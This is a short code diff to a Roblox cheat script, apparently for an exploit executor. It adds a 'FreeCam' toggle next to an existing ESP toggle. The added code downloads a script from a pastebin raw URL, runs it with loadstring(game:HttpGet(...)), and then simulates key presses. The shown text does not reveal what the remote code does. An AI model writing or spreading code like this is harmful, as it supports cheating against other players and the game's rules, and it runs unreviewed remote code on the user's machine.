@@ -300,6 +300,18 @@ local ScriptXToggle = ScriptX.AddToggle("Esp", false, function(Value)
     end)
 end)
 
+local ScriptXToggle = ScriptX.AddToggle("FreeCam", false, function(Value)
+    getgenv().Press = function(v)
+        return game:GetService("VirtualInputManager"):SendKeyEvent(true, v, false, game);
+    end
+    if not getgenv().Running then
+        getgenv().Running = true
+        loadstring(game:HttpGet("https://pastebin.com/raw/Jq6r8VAm"))();
+    end
+    Press("LeftBracket")
+    Press("N")
+end)
+
 getgenv().Stored = {}
 
 for i,v in ipairs(game.Players:GetPlayers()) do
